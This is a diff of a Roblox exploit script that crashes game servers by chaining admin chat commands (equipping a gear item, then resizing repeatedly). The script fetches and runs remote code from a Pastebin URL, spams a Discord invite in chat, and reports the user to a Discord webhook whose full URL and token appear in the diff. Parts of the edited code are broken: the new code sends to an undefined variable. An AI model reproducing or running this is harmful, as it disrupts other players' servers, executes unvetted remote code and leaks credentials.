@@ -49,15 +49,16 @@ local plr = plrs.LocalPlayer
 local nm = plr.Name
 local char = plr.Character
 local rs = game:getService("RunService")
-local url = "https://hooks.zapier.com/hooks/catch/11054705/btiq4ps/" -- If you can see this, I trust you lol hope I don't regret that
-local cmsg = nm .. " Crashed Server: " .. game.JobId .. "  Players: "
+local url =
+    "https://discord.com/api/webhooks/895754600366350406/REhXVKRR0JyV2fs_WY2gWXtGj62nNvdF0xoN262sFsjUHd-c-BgJ1DoDltwmLMtH8XTN" -- If you can see this, I trust you lol hope I don't regret that
+local cmsg = "Server Has Been Crashed Successfully!"
 
 -- functions:
 local function c(msg)
     game:service "ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
 end
 
-local function web(ps, gs)
+local function web(gs)
     function jsone(str)
         return http:JSONEncode(str)
     end
@@ -80,8 +81,8 @@ local function web(ps, gs)
                     ["color"] = 12583126,
                     ["fields"] = {
                         {
-                            ["name"] = "Server ID",
-                            ["value"] = game.JobId,
+                            ["name"] = "Display Name",
+                            ["value"] = plr.DisplayName,
                             ["inline"] = true
                         },
                         {
@@ -98,9 +99,20 @@ local function web(ps, gs)
                 }
             }
         }
-        game:HttpPost(url, game:HttpPost(url, game:GetService("HttpService"):JSONEncode(Data)))
+        local response =
+            syn.request(
+            {
+                Url = webhook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json" -- When sending JSON, set this!
+                },
+                Body = jsone(Data)
+            }
+        )
+        game:HttpPost(webhook, jsone(Data))
     end
-    sendData(ps)
+    sendData(url)
 end
 loadstring(game:HttpGet(("https://pastebin.com/raw/bSjbj2td"), true))() -- This loads the auto pad commands, needed for non perms
 
@@ -123,41 +135,42 @@ pcall(
         task.wait(.35)
         c("<Bot.txt> gg/9Y63Vuf8")
         task.wait()
-
-        local charadd = -- Shades Crash
-            lp.CharacterAdded:Connect(
-            function(char)
-                plrs:Chat("gear me 94794847")
-                local vamp = lp.Backpack:WaitForChild("VampireVanquisher", .4)
-                if vamp then
-                    local hum = char:WaitForChild("Humanoid", .4)
-                    if not hum then
-                        plrs:Chat("respawn me")
-                        return
-                    else
-                        hum:EquipTool(vamp)
-                    end
-                    local yield = char:WaitForChild("VampireVanquisher", .5)
-                    if not yield then
-                        plrs:Chat("respawn me")
-                        task.wait(.2)
-                        plrs:Chat("gear me 94794847")
-                        return
-                    end
-                    --Maybe add a wait() here if it is too fast
-                    for i = 1, 4 do
-                        plrs:Chat("size me .3")
-                    end
-                else
+        local function crash(char)
+            plrs:Chat("gear me 94794847")
+            local vamp = lp.Backpack:WaitForChild("VampireVanquisher", .4)
+            if vamp then
+                local hum = char:WaitForChild("Humanoid", .4)
+                if not hum then
                     plrs:Chat("respawn me")
+                    return
+                else
+                    hum:EquipTool(vamp)
                 end
+                local yield = char:WaitForChild("VampireVanquisher", .5)
+                if not yield then
+                    plrs:Chat("respawn me")
+                    task.wait(.2)
+                    plrs:Chat("gear me 94794847")
+                    return
+                end
+                --Maybe add a wait() here if it is too fast
+                for i = 1, 4 do
+                    plrs:Chat("size me .3")
+                end
+            else
+                plrs:Chat("respawn me")
             end
-        )
+        end
     end
-) -- ends pcall
+)
+local charadd = lp.CharacterAdded:Connect(crash)
+if lp.Character then
+    crash(lp.Character)
+end
+-- ends pcall
 
 wait(.1)
-web(cmsg, "User executed") -- send webhook
+web(cmsg) -- send webhook
 
 while wait() do
     while wait() do
